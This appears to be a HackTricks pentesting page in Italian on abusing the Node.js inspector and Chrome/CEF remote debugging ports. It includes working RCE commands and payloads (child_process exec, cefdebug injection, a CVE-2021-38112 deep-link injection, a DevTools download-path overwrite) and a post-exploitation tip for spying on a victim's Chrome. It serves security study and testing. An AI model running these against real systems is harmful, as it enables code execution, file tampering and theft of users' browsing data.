# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

[Secondo la documentazione](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): quando viene avviato con l'opzione `--inspect`, un processo Node.js resta in ascolto di un client di debugging. Per **impostazione predefinita**, resterà in ascolto sull'host e sulla porta **`127.0.0.1:9229`**. A ogni processo viene inoltre assegnato un **UUID** **univoco**.

I client Inspector devono conoscere e specificare l'indirizzo dell'host, la porta e l'UUID per connettersi. Un URL completo sarà simile a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Poiché il **debugger ha accesso completo all'ambiente di esecuzione Node.js**, un attore malintenzionato in grado di connettersi a questa porta potrebbe riuscire a eseguire codice arbitrario per conto del processo Node.js (**potential privilege escalation**).

Esistono diversi modi per avviare un Inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Quando avvii un processo sottoposto a ispezione, apparirà qualcosa di simile:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
I processi basati su **CEF** (**Chromium Embedded Framework**) devono usare il parametro: `--remote-debugging-port=9222` per aprire il **debugger** (le protezioni SSRF rimangono molto simili). Tuttavia, **invece** di concedere una sessione di **debug** **NodeJS**, comunicheranno con il browser utilizzando il [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), un'interfaccia per controllare il browser, ma non consente una RCE diretta.

Quando avvii un browser sottoposto a debug, apparirà qualcosa di simile:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browser, WebSocket e same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

I siti web aperti in un browser possono effettuare richieste WebSocket e HTTP secondo il modello di sicurezza del browser. È necessaria una **connessione HTTP iniziale** per **ottenere un identificativo univoco della sessione del debugger**. La **same-origin-policy** **impedisce** ai siti web di effettuare **questa connessione HTTP**. Per una maggiore sicurezza contro i [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifica che gli **header 'Host'** della connessione specifichino esattamente un **indirizzo IP**, **`localhost`** oppure **`localhost6`**.

> [!TIP]
> Questa **misura di sicurezza impedisce di sfruttare l'inspector** per eseguire codice **inviando semplicemente una richiesta HTTP** (operazione possibile sfruttando una SSRF vuln).

### Avvio dell'inspector nei processi in esecuzione

È possibile inviare il **segnale SIGUSR1** a un processo nodejs in esecuzione per fare in modo che **avvii l'inspector** sulla porta predefinita. Tuttavia, è necessario disporre di privilegi sufficienti; ciò potrebbe quindi concedere **accesso privilegiato alle informazioni all'interno del processo**, ma non comporta un'escalation diretta dei privilegi.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Questo è utile nei container perché **arrestare il processo e avviarne uno nuovo** con `--inspect` **non è un'opzione**, poiché il **container** verrà **terminato** insieme al processo.

### Connessione all'inspector/debugger

Per connettersi a un browser basato su **Chromium**, è possibile accedere agli URL `chrome://inspect` o `edge://inspect` rispettivamente per Chrome o Edge. Facendo clic sul pulsante Configure, è necessario assicurarsi che l'**host e la porta di destinazione** siano elencati correttamente. L'immagine mostra un esempio di Remote Code Execution (RCE):

![Dopo un URL per accedere al debugger apparirà. ad es. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Connessione all'inspector/debugger: per connettersi a un browser basato su Chromium,...](<../../images/image (674).png>)

Utilizzando la **riga di comando**, è possibile connettersi a un debugger/inspector con:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Lo strumento [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) consente di **trovare gli inspector** in esecuzione localmente e di **iniettare codice** al loro interno.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Nota che gli exploit di **RCE** in **NodeJS** non funzioneranno se connessi a un browser tramite [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (è necessario controllare l'API per trovare cose interessanti da fare con esso).

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> Se sei arrivato qui cercando come ottenere [**RCE da una XSS in Electron, controlla questa pagina.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Alcuni modi comuni per ottenere **RCE** quando puoi **connetterti** a un **inspector** di Node consistono nell'usare qualcosa come (sembra che questo **non funzionerà con una connessione al Chrome DevTools protocol**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Puoi consultare l'API qui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
In questa sezione mi limiterò a elencare alcune cose interessanti che ho trovato e che sono state utilizzate per sfruttare questo protocollo.

### Parameter Injection via Deep Links

Nel [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security ha scoperto che un'applicazione basata su CEF **registrava un URI personalizzato** nel sistema (workspaces://index.html), che riceveva l'URI completo e poi **avviava l'applicazione basata su CEF** con una configurazione costruita parzialmente a partire da quell'URI.

È stato scoperto che i parametri dell'URI venivano decodificati tramite URL e utilizzati per avviare l'applicazione di base CEF, consentendo a un utente di **iniettare** il flag **`--gpu-launcher`** nella **command line** ed eseguire codice arbitrario.

Quindi, un payload come:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Eseguirà calc.exe.

### Sovrascrivere i file

Cambia la cartella in cui **verranno salvati i file scaricati** e scarica un file per **sovrascrivere** il **codice sorgente** dell'applicazione utilizzato frequentemente con il tuo **codice malevolo**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE and exfiltration

Secondo questo post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) è possibile ottenere RCE ed effettuare l'exfiltration di pagine interne da theriver.

### Post-Exploitation

In un ambiente reale e **dopo aver compromesso** un PC utente che utilizza un browser basato su Chrome/Chromium, potresti avviare un processo Chrome con il **debugging attivato ed effettuare il port forwarding della porta di debugging**, in modo da potervi accedere. In questo modo potrai **ispezionare tutto ciò che la vittima fa con Chrome e rubare informazioni sensibili**.

Il metodo stealth consiste nel **terminare ogni processo Chrome** e quindi eseguire qualcosa come
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Riferimenti

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
